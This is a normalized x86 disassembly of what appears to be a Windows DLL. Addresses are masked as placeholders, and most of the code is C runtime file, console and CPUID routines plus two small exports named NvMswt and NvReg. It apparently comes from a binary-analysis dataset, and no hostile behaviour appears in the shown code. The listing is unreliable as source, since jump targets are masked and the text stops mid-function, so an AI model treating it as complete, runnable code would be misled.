cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_1000901a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_100031b5
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_1000844c
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] __dos_header
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_100085bc
push 0x14
push r--data
call sub_10004af0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_10004d21
mov [ eax ] 0x9
jmp r-xdata
call sub_10004d21
mov [ eax ] 0x9
call sub_10005458
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_100090cb
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_10004d21
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_100091dd
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_10004b35
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008681
mov eax esi
jmp r-xdata
call sub_10004ced
mov [ eax ] esi
sub_100086a2
push 0x10
push r--data
call sub_10004af0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
jmp r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
call sub_10005458
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_100090cb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_10004d21
mov [ eax ] 0x9
call sub_10004ced
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10008784
add esp 0xc
mov edi eax
jmp r-xdata
call sub_10004b35
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000875b
mov eax edi
jmp r-xdata
sub_10008784
push ebp
mov ebp esp
mov eax 0x1af0
call sub_100090a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_10004ced
and [ eax ] edi
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10002b9f
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_10004ced
and [ eax ] edi
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_10007fb7
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_100092b1
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_100039a4
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_10004d21
mov [ eax ] 0x1c
call sub_10004ced
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_10004d00
pop ecx
jmp r-xdata
call sub_10004d21
mov [ eax ] 0x9
call sub_10004ced
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_100092a0
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_1000942d
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_10009415
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_10009415
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_1000942d
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_10008fae
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10008051
push esi
mov edi eax
call sub_100095d2
push esi
call sub_10007f93
push eax
call sub_1000946e
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_100031b5
and [ esi + 0x1c ] 0x0
pop ecx
sub_1000901a
push 0xc
push r--data
call sub_10004af0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
push esi
call sub_1000687c
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10008fae
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10009089
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_10004b35
retn
sub_100090a0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_100090cb
push 0x8
push r--data
call sub_10004af0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_10004b35
retn
push 0xa
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000914e
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_10009157
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_10004d21
mov [ eax ] 0x9
call sub_10004ced
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_100091dd
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
jmp r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
call sub_10005458
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10009244
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000926a
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10003636
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100092b1
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100091dd
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_10004d21
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_10004d00
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_10009322
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10003636
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1000926a
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_10004d21
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_1000942d
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_10009619
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1000946e
push 0x10
push r--data
call sub_10004af0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
jmp r-xdata
call sub_10004ced
and [ eax ] 0x0
call sub_10004d21
mov [ eax ] 0x9
call sub_10005458
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_100090cb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_10004d21
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_10009538
pop ecx
mov edi eax
jmp r-xdata
call sub_10004b35
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000950f
mov eax edi
jmp r-xdata
sub_10009538
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_100091dd
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_10004d00
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_100091dd
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_100091dd
push 0x1
mov esi eax
call sub_100091dd
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_10009157
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_100095d2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_100031b5
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
NvMswt
push ebp
mov ebp esp
push 0x4ff
push 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn 0x8
NvReg
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ RegisterClassW@IAT ]
xor ecx ecx
test ax ax
setne cl
mov eax ecx
pop ebp
retn 0x4
j_sub_100031b5
jmp sub_100031b5
sub_10002c6a
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1000329a
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002c85
mov [ ecx ] r--data
jmp sub_100032bd
sub_10002d04
push ebp
mov ebp esp
pop ebp
jmp sub_10002d0d
sub_10002d0d
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
